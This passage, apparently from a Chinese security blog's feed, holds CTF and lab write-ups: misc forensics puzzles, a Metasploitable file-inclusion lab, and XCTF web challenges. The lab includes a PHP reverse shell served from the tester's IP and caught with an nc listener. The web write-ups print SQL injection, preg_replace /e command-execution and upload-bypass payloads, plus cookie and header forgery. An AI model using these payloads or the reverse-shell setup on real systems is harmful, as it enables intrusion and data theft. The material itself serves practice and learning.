title="21神奇的Modbus"></a>21神奇的Modbus</h5><p>下载下来是一个流量包，用wireshark打开，搜索关键字flag，追踪数据流，这里搜索关键字没用，全部查看下来发现这里有flag，flag为<code>sctf{Easy_Modbus}</code>，要多加一个o</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006175636.png" alt></p><h5 id="22-4-1"><a href="#22-4-1" class="headerlink" title="22.4-1"></a>22.4-1</h5><p>下载下来是一张图片，用binwalk查看一下，有点东西，foremost分离出来两张图片，用盲水印攻击，加密脚本：<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark</a></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008194236.png" alt></p><h5 id="23-can-has-stdio"><a href="#23-can-has-stdio" class="headerlink" title="23.can_has_stdio?"></a>23.can_has_stdio?</h5><p>下载解压包解压得文件用记事本打开，看到得,+,-,.,[,]等符号组成得五角星，可以猜测是Brainfuck语言了，</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006222959.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006222544.png" alt></p><p>到<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a>这个网站翻译Brainfuck为文本</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006223109.png" alt></p><h5 id="24-5-1"><a href="#24-5-1" class="headerlink" title="24.5-1"></a>24.5-1</h5><p>考察xortool工具的使用，安装python库<code>pip2 install xortool</code>,猜测最有可能得密钥长度为13，</p><pre><code>xortool cd2a80e1b48e44b5a830605e684ffb31  -l 13 -c 20 //-l 指定密钥长度 -表示出现频率最高的字符。 </code></pre><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006230247.png" alt></p><p>使用脚本解密出原文，flag为<code>wdflag{You Are Very Smart}</code></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006230727.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006230704.png" alt></p><h5 id="25-MISCal"><a href="#25-MISCal" class="headerlink" title="25.MISCal"></a>25.MISCal</h5><p>下载解压后不知道是什么文件，用file命令查看一下，是bzip2文件，修改文件后缀名为.bz2,解压文件</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006234837.png" alt></p><p>发现是git目录，里面有个flag.txt文件不过flag值.<code>git log</code>查看git日志，<code>git stash list</code>列出所有保存的进度列表，<code>git stash apply</code>恢复暂缓区的内容，有s.py文件，运行一下可以得到flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006235042.png" alt></p><h5 id="26-3-1"><a href="#26-3-1" class="headerlink" title="26.3-1"></a>26.3-1</h5><p>下载下来是rar压缩包，不过文件没有文件后缀名，binwalk查看得rar，添加.rar文件后缀名，提取压缩包出来时一个流量包，用wireshark打开，搜索flag关键字，追踪数据流，在第6个流可以看到flag.rar,base64编码</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191007002722.png" alt></p><p>导出对象，选择http，flag.rar文件，解压需要密码，可以从数据流中可以看解密脚本多半时压缩包密码</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191007003212.png" alt></p><p>提取出来整合修改下</p><pre><code class="python"># coding:utf-8from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64IV = &#39;QWERTYUIOPASDFGH&#39;def decrypt(encrypted):  aes = AES.new(IV, AES.MODE_CBC, IV)  return aes.decrypt(encrypted)def encrypt(message):  length = 16  count = len(message)  padding = length - (count % length)  message = message + &#39;\0&#39; * padding  aes = AES.new(IV, AES.MODE_CBC, IV)  return aes.encrypt(message)str = &#39;19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo=&#39;example = decrypt(base64.b64decode(str))print exampleprint decrypt(example)</code></pre><p>脚本运行一下，打开flag.txt即可看到flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191007003510.png" alt></p><h5 id="27-适合作为桌面"><a href="#27-适合作为桌面" class="headerlink" title="27.适合作为桌面"></a>27.适合作为桌面</h5><p>下载压缩包解压是一张图片，放stegsolve弄一下，可以看到一个二维码，扫一下可以看到一串数字</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191007193401.png" alt></p><p>这是一串十六进制的数字，在winhex里创建一份文件，把这些数字写进去，保存为.pyc</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191007194111.png" alt></p><p>到<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">https://tool.lu/pyc/</a>这个网站解密pyc文件，解密出来python脚本跑一下即为flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191007194315.png" alt></p><h5 id="28-Banmabanma"><a href="#28-Banmabanma" class="headerlink" title="28.Banmabanma"></a>28.Banmabanma</h5><p>下载下来是一张斑马的图片，猜测是条形码</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191007195624.png" alt></p><p>到<a href="https://online-barcode-reader.inliteresearch.com/解码一下，都不用ps一下了，nb" target="_blank" rel="noopener">https://online-barcode-reader.inliteresearch.com/解码一下，都不用ps一下了，nb</a></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1570449539291.png" alt></p><h5 id="29-simple-transfer"><a href="#29-simple-transfer" class="headerlink" title="29.simple_transfer"></a>29.simple_transfer</h5><p>下载下来是个流量包，binwalk有点东西，foremost分离出来个pdf，打开pdf即可看到flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191007202130.png" alt></p><h5 id="30-warmup"><a href="#30-warmup" class="headerlink" title="30.warmup"></a>30.warmup</h5><p>下载下来是一张图片和一个加密的zip包，加密的zip也有一个open_forum.png的文件，把open_forum.png压缩用ARCHPR明文进行攻击，破解出加密的zip包，这里要注意压缩软件要使用winrar</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191007232726.png" alt></p><p>解压出来的是两张一样的图，猜测是盲水印，这里使用<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark</a>解盲水印的脚本跑出水印的图片即为flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1570463479080.png" alt></p><h5 id="31-我们的秘密是绿色的"><a href="#31-我们的秘密是绿色的" class="headerlink" title="31.我们的秘密是绿色的"></a>31.我们的秘密是绿色的</h5><p>下载下来是张日历图片，这里根据题目名字提示，我们要用到Our secret文件隐藏加密软件，密码即是日历图中绿色数字0405111218192526，</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008112038.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008112324.png" alt></p><p>可以得到try压缩包，用记事本打开可以看到有生日提示，那就用生日当作密码进行暴力破解，密码最长8位</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008113237.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008112959.png" alt></p><p>有破解的密码解压还是一个带加密的zip包，不过zip也有一个readme.txt，明文攻击走起，得到密码Y29mZmVl</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008114338.png" alt></p><p>解压后又一个加密压缩包，爆破无解，用winhex打开看看，看到伪加密了，把01改成00，解压就不需要密码了</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008115502.png" alt></p><p>解压后得到一个flag.txt文本，内容为<code>qddpqwnpcplen%prqwn_{_zz*d@gq}</code>，猜测栅栏密码，再凯撒密码</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008115831.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008120202.png" alt></p><h5 id="32-Just-No-One"><a href="#32-Just-No-One" class="headerlink" title="32.Just-No-One"></a>32.Just-No-One</h5><p>下载下来后是一个.exe程序，安装后提醒flag值再安装许可协议，所以找吧，flag即为ILOVEREADINGEULAS</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008121201.png" alt></p><h5 id="33-Erik-Baleog-and-Olaf"><a href="#33-Erik-Baleog-and-Olaf" class="headerlink" title="33.Erik-Baleog-and-Olaf"></a>33.Erik-Baleog-and-Olaf</h5><p>下载下来是一张图片，用winhex打开看看，可以看到一个图片网址，<a href="http://i.imgur.com/22kUrzm.png" target="_blank" rel="noopener">http://i.imgur.com/22kUrzm.png</a></p><p>到这个网址把图片下载下来，（需要fq）再对比两张图片，这里我用到的软件是beyond compare,可以看到二维码</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008130618.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008130947.png" alt></p><h5 id="34-Py-Py-Py"><a href="#34-Py-Py-Py" class="headerlink" title="34.Py-Py-Py"></a>34.Py-Py-Py</h5><h5 id="35-Reverse-it"><a href="#35-Reverse-it" class="headerlink" title="35.Reverse-it"></a>35.Reverse-it</h5><p>下载下来一个不知道是什么文件，binwalk也看不出来，放进winhex看一下，可以文件末尾数字反转过过来就是jpg的文件头FFD8FF 。再结合题目名字，把所有的数字反转过来，winhex新建一个文件，保存jpg</p><p>格式</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008173443.png" alt></p><p>新文件图片如下，有点难看哈，拿一个镜子对着图片照，就容易看了，flag为：<code>SECCON{6in_tex7}</code></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008173905.png" alt></p><h5 id="36-mysql"><a href="#36-mysql" class="headerlink" title="36.mysql"></a>36.mysql</h5><p>下载出来一个压缩包，再解压后的所有文件内容搜索关键字flag，再ib_logfile0文件找到flag，</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008174623.png" alt></p><h5 id="37-4433"><a href="#37-4433" class="headerlink" title="37.4433"></a>37.4433</h5><h5 id="38-4433"><a href="#38-4433" class="headerlink" title="38.4433"></a>38.4433</h5><h5 id="40-心仪的公司"><a href="#40-心仪的公司" class="headerlink" title="40.心仪的公司"></a>40.心仪的公司</h5><p>下载解压时一个流量包，追踪http流可以看到flag，有点难找啊</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008191503.png" alt></p><h5 id="42-很普通的数独"><a href="#42-很普通的数独" class="headerlink" title="42.很普通的数独"></a>42.很普通的数独</h5>]]></content:encoded>
      
      <comments>https://www.jaie.cc/2020/07/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%83%A8%E5%88%86misc%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98/#disqus_thread</comments>
    </item>
    
    <item>
      <title>文件遍历漏洞</title>
      <link>https://www.jaie.cc/2020/07/11/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</link>
      <guid>https://www.jaie.cc/2020/07/11/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</guid>
      <pubDate>Fri, 10 Jul 2020 22:45:43 GMT</pubDate>
      <description>
      
        
        
          &lt;ol&gt;
&lt;li&gt;环境搭建&lt;br&gt;测试机ip：192.168.86.135&lt;br&gt;&lt;br&gt;靶机metasploittable的ip:192.168.86.128&lt;br&gt;靶机编辑php.ini文件&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;sudo vim /etc/php5/c
        
      
      </description>
      
      <content:encoded><![CDATA[<ol><li>环境搭建<br>测试机ip：192.168.86.135<br><br>靶机metasploittable的ip:192.168.86.128<br>靶机编辑php.ini文件</li></ol><pre><code>sudo vim /etc/php5/cgi/php.ini  //编辑php配置文件</code></pre><p>找到allow_url_include这一行把Off改成On，  </p><pre><code>sudo /etc/init.d/apache2 restart //重启apache服务 </code></pre><ol start="2"><li>发起攻击  </li></ol><ul><li>尝试文件<code>/etc/passwd</code>遍历查看，成功。<br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.07-59.png" alt></li><li>尝试定位url链接，成功<br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/%E5%AE%9A%E4%BD%8D%E5%88%B0%E4%B8%80%E4%B8%AAurl%202018.11.21%2022.13-23.png" alt></li><li>测试机开启apache服务，制作php反弹shell，使其定位其链接<a href="http://192.168.86.135/1.php" target="_blank" rel="noopener">http://192.168.86.135/1.php</a><br><code>`</code><br>cp /url/share/webshells/php/php-reverse-shell.php /var/www/html/1.php  //复制成1.php到web目录下<br>vim 1.php //修改127.0.0.1成测试机ip完成保存<br>service apache2 start  //开启apache服务<br><br>nc -nvvlp 1234  //nc开启监控端口</li></ul><p><code>`</code><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/php%E5%8F%8D%E5%BC%B9shell.png" alt><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.27-9.png" alt><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.28-18.png" alt></p>]]></content:encoded>
      
      <comments>https://www.jaie.cc/2020/07/11/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#disqus_thread</comments>
    </item>
    
    <item>
      <title>攻防世界web 高手区部分Writeup</title>
      <link>https://www.jaie.cc/2020/07/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%20%E9%83%A8%E5%88%86wp/</link>
      <guid>https://www.jaie.cc/2020/07/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%20%E9%83%A8%E5%88%86wp/</guid>
      <pubDate>Fri, 10 Jul 2020 22:45:43 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;攻防世界web高手区&quot;&gt;&lt;a href=&quot;#攻防世界web高手区&quot; class=&quot;headerlink&quot; title=&quot;攻防世界web高手区&quot;&gt;&lt;/a&gt;攻防世界web高手区&lt;/h1&gt;&lt;h2 id=&quot;1-ics-06&quot;&gt;&lt;a href=&quot;#1-ics-06&quot; cla
        
      
      </description>
      
      <content:encoded><![CDATA[<h1 id="攻防世界web高手区"><a href="#攻防世界web高手区" class="headerlink" title="攻防世界web高手区"></a>攻防世界web高手区</h1><h2 id="1-ics-06"><a href="#1-ics-06" class="headerlink" title="1.ics-06"></a>1.ics-06</h2><p>url中id=1，进行爆破，到2333，出现flag</p><p>Flag:cyberpeace{4468f3e51629f05830259d073f03dbd6}</p><h2 id="2-NewsCenter-——sql注入"><a href="#2-NewsCenter-——sql注入" class="headerlink" title="2. NewsCenter ——sql注入"></a>2. NewsCenter ——sql注入</h2><p>sql注入post型，sqlmap自动化注入，sqlmap.py -r “post.txt” –dbs -D news -T secret_table –dump</p><p>flag:QCTF{sq1_inJec7ion_ezzz}</p><h2 id="3-Mfw-——-git路径信息泄漏"><a href="#3-Mfw-——-git路径信息泄漏" class="headerlink" title="3. Mfw ——.git路径信息泄漏"></a>3. Mfw ——.git路径信息泄漏</h2><p>进行目录扫描，发现。.git目录泄漏</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image002.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image004.jpg" alt="img"></p><p>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image006.jpg" alt="img"></p><p>flag.php源文件看不所以来，去index.php看一下进行代码审计</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image008.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image010.jpg" alt="img"></p><p>$file = “templates/“ . $page . “.php”;page这个变量是直接从GET参数中获取的，没有进行任何处理，那么也就意味着我们输入的任何东西就能够在不被验证的情况下执行。那么，我们可以在这个位置放置system函数。这样，由于后面的assert函数，system函数就成功得以运行并输出结果。</p><p>构建$file变量：$file = “templates/“ . ‘.system(“ pwd ;”).’ . “.php”;</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image012.jpg" alt="img"></p><p>flag.php不存在，使用git diff比较工作区与暂存区的差异</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image014.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image016.jpg" alt="img"></p><h2 id="4-NaNNaNNaNNaN-Batman"><a href="#4-NaNNaNNaNNaN-Batman" class="headerlink" title="4. NaNNaNNaNNaN-Batman"></a>4. NaNNaNNaNNaN-Batman</h2><p>下载下来的压缩包解压，得到一个web100的文本，查看是乱码，但还是可以看出是js代码，把文件类型改为html，在浏览器打开</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image018.jpg" alt="img"></p><p>把eval（）函数改成alert()函数，弹窗可以得到源代码了</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image020.jpg" alt="img"></p><p>js function $() { var e = document.getElementById(‘c’).value; if (e.length == 16) { if (e.match(/^be0f23/) != null) { if (e.match(/233ac/) != null) { if (e.match(/e98aa$/) != null) { if (e.match(/c7be9/) != null) { var t = [‘fl’, ‘s_a’, ‘i’, ‘e}’]; var n = [‘a’, ‘_h0l’, ‘n’]; var r = [‘g{‘, ‘e’, ‘<em>0’]; var i = [‘it\’’, ‘</em>‘, ‘n’]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) { document.write(s[o % 4][0]); s[o % 4].splice(0, 1); } } } } } } } document.write(‘<input id="c"><button onclick="$()">Ok</button>‘); delete _;</p><p>根据分析是正则表达式</p><p>be0f233ac7be98aa。</p><p>把它输入文本框，得到flag值，</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image022.jpg" alt="img"></p><h2 id="5-Upload-—————文件名注入"><a href="#5-Upload-—————文件名注入" class="headerlink" title="5. Upload   —————文件名注入"></a>5. Upload   —————文件名注入</h2><p>用常规的文件上传方式失败无果，且无法得到上传文件放置的目录</p><p>文件名称注入,使用select,from,发现被过滤，内嵌select绕过过滤，使用CONV,substr,hex</p><p>函数，CONV函数将16进制转化为10进制，依次获取子串的12位，用substr截取12是因为一旦过长，会用科学计数法表示。</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image024.jpg" alt="img"></p><p>返回回显数字131277325825392转化为字符串为web_up即为部分库名，</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image026.jpg" alt="img"></p><p>文件名’+(selselectect CONV(substr(hex(dAtaBase()),13,12),16,10))+’.jpg让其显示库名的后部分</p><p>1819238756转化二进制转化字符串即为load，合并前一部分数据库名为web_upload</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image028.jpg" alt="img"></p><p>文件名 ‘+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema=’web_upload’ limit 1,1)),1,12),16,10))+’.jpg</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image030.jpg" alt="img"></p><p>转换为字符串为：hello_</p><p>文件名’+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema=’web_upload’ limit 1,1)),13,12),16,10))+’.jpg</p><p>得到回显为：112615676665705转化字符串flag_i</p><p>继续探测表名，</p><p>文件名’+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema=’web_upload’ limit 1,1)),25,12),16,10))+’.jpg</p><p>得到回显：126853610566245转化字符串：s_here</p><p>最终得到表名为：hello_flag_is_here</p><p>得到表名继续探测列名构建sql注入语句</p><p>文件名’+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’ limit 0,1)),1,12),16,10))+’.jpg</p><p>得到回显为：115858377367398转化为字符串i_am_f</p><p>文件名’+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’ limit 0,1)),13,12),16,10))+’.jpg</p><p>得到回显为7102823转化字符串lag。</p><p>所以列名为i_am_flag</p><p>导出列名得值构建sql语句</p><p>文件名’+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+’.jpg</p><p>得到回显为：36427215695199</p><p>转化字符串为!!_@m_</p><p>继续构造sql函数</p><p>文件名’+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+’.jpg</p><p>得到回显为：92806431727430</p><p>转化字符串为Th.e_F</p><p>文件名’+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+’.jpg</p><p>得到回显560750951</p><p>转化为!lag</p><p>拼接完成为!!_@m_ Th.e_F!lag即为flag值</p><h2 id="6-PHP2"><a href="#6-PHP2" class="headerlink" title="6. PHP2"></a>6. PHP2</h2><p>进行目录扫描，发现index.php的备份文件index.php2,</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image032.jpg" alt="img">访问index.php2文件查看源代码，根据代码要使登录成功必须满足两个条件，第一步，要使得”admin”===$_GET[id]不成立</p><p>第二步，经过$_GET[id] = urldecode($_GET[id]);，使得$_GET[id] == “admin”成立。</p><pre><code>?id=%2561dmin</code></pre><p>urldecode/urlencode</p><p>当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode</p><p>然后在这段代码中运行时，会自动进行一次urldecode</p><p>在urldecode()函数中，再一次进行一次解码</p><p>urldecode(%2561)=%61</p><p>urldecode(%61)=a</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image034.jpg" alt="img"></p><h2 id="7-unserialize3-——php反序列化"><a href="#7-unserialize3-——php反序列化" class="headerlink" title="7. unserialize3 ——php反序列化"></a>7. unserialize3 ——php反序列化</h2><p>打开网页后是一段php代码，对其进行审计，进行序列化</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image036.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image038.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image040.gif" alt="5ed305f75daf17bd8727a0af171f584"></p><p>然后通过_wakeup()执行漏洞（一个字符串或对象被序列化后，如果其属性被修改，则不会执行<strong>wakeup()函数）来绕过这个wakeup函数。我们把序列码修改其属性1为2后，输入url中，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过</strong>wakeup的执行</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image042.jpg" alt="img"></p><h2 id="8-Cat-——命令注入"><a href="#8-Cat-——命令注入" class="headerlink" title="8. Cat  ——命令注入"></a>8. Cat  ——命令注入</h2><p>看到题目尝试ping下可通，用命令连接符连接命令，ls，echo，cat等命令发现无果</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image044.jpg" alt="img"></p><p>url中可接受url编码，%80特殊ascii码符号，url编码使用的是16进制，80也就是128，ASCII码是从0-127，使其产生报错，根据报错信息可得知是基于python环境<a href="https://www.django.cn/" target="_blank" rel="noopener">django</a> web框架，根据框架得信息和框架结构，使用php curl，@</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image046.gif" alt="å¨è¿éæå¥å¾çæè¿°"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image048.jpg" alt="img"></p><p><a href="mailto:访问配置文件@/opt/api/api/settings.py" target="_blank" rel="noopener">访问配置文件@/opt/api/api/settings.py</a>，搜索关键词database，等到数据库的信息</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image050.jpg" alt="img"></p><p><a href="mailto:访问@/opt/api/database.sqlite3" target="_blank" rel="noopener">访问@/opt/api/database.sqlite3</a>，搜索关键字ctf，得到flag值</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image052.jpg" alt="img"></p><h2 id="9-ics-04——sql-post注入"><a href="#9-ics-04——sql-post注入" class="headerlink" title="9. ics-04——sql post注入"></a>9. ics-04——sql post注入</h2><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image054.jpg" alt="img"></p><p>首先先尝试一下登录，注册一个名为admin的账号，登录后，告诉我是普通用户，无效</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image056.jpg" alt="img"></p><p>点击一下忘记密码，看看有没有其他出路</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image058.jpg" alt="img"></p><p>修改的还是admin普通账户，现在我开启burp进行拦包，看有没有越权操作，好像有没有什么可以操作的，到时揽到一个post的包，sqlmap跑一下再说</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image060.jpg" alt="img"></p><p>跑出来了，密码进行md5解密，为1qazWSXED56yhn8ujm9olk81wdfTG，去登陆，成功，取得flag</p><p> <img src="/2020/07/11/攻防世界web 部分wp/clip_image062.jpg" alt="img"></p><h2 id="10-Isc-05"><a href="#10-Isc-05" class="headerlink" title="10.Isc-05"></a>10.Isc-05</h2><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image064.jpg" alt="img"></p><p>进入指定页面发现平白无奇，查看源代码，发现传参page，在url尝试一波，试了一下不是命令执行，而是php伪协议的文件包含</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image066.jpg" alt="img"></p><p>Php伪协议base64读取index.php源代码。</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image068.jpg" alt="img"></p><p>把转化明文，从源代码中可以看出要求X_FORWARDED_FOR为127.0.0.1，并且有3个get方式可传参数，pat、rep、sub</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image070.jpg" alt="img"></p><p>构造url：/index.php?pat=/(.*)/e&amp;rep=system(‘ls’)&amp;sub=aa  如图</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image072.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image074.jpg" alt="img"></p><p>?pat=/(.*)/e&amp;rep=system(‘ls+s3chahahaDir’)&amp;sub=aa  查看s3chahahaDir文件夹</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image076.jpg" alt="img"></p><p>?pat=/(.*)/e&amp;rep=system(‘ls+s3chahahaDir/flag’)&amp;sub=aa 查看flag文件夹，发现flag.php文件</p><p>/index.php?pat=/(.*)/e&amp;rep=system(‘cat+s3chahahaDir/flag/flag.php’)&amp;sub=aa  查看flag，</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image078.jpg" alt="img"></p><p>在查看页面源代码中可以看到flag值</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image080.jpg" alt="img"></p><h2 id="11-BUG"><a href="#11-BUG" class="headerlink" title="11.BUG"></a>11.BUG</h2><p>开局就注册和登陆的界面</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image082.jpg" alt="img"></p><p>先任意注册一个用户，登陆后发现cookie user值是md5加密的，发现cookie值得组成方式是”uid:用户名”的形式组成的，可得到admin用户的cookie未加密时为”1:admin” 修改user为admin加密的md5值，刷新发现home模块还是显示abc用户，并且menge模块不可看</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image084.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image086.jpg" alt="img"></p><p>点击persional，修改url的uid为1，就可以admin的个人信息</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image088.jpg" alt="img"></p><p>退出登陆，然后去找回密码的功能模块，根据得到个人信息修改密码</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image090.jpg" alt="img"></p><pre><code>修改完密码后进行登陆，点击Manager模块，报IP错误，修改ip为X-Forwarded-For: 127.0.0.1，成功，后查看源代码有传参可以传，”?module=filemanage&amp;do=???”尝试之后？？？为upload</code></pre><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image092.jpg" alt="img"><img src="file:///C:/Users/jaie/AppData/Local/Temp/msohtmlclip1/01/clip_image094.jpg" alt="img"></p><p>上传一个php文件，为了绕过进行里php语言的特殊写法<script language="php"></script>如图，进行绕过处理mime改为image/png,文件名为:php4,上传成功，回宣得到flag值</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image096.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image098.jpg" alt="img"></p><h2 id="12-wtf-sh-150"><a href="#12-wtf-sh-150" class="headerlink" title="12.wtf.sh-150"></a>12.wtf.sh-150</h2><p>进入后发现是一个论坛网站，有登录注册，帖子，任意点击一个帖子，发现url中有可测试的尝试，尝试一波发现有文件包含漏洞，可以爆出源代码，将源代码格式化一下方便阅读</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image100.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image102.jpg" alt="img"></p><p>从源代码中可以看到存在user目录，且admin登录可以得到flag，遍历进入users目录后好像可以看到类似admin账号cookie</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image104.jpg" alt="img"></p><p>注册一个账户，登录后修改相关的cookie值，刷新后登录为admin账户</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image106.jpg" alt="img"></p><p>点击profile标签，在网页末尾可以看到flag值，但这只是flag值前一部分</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image108.jpg" alt="img"></p><h2 id="13-i-got-id-200"><a href="#13-i-got-id-200" class="headerlink" 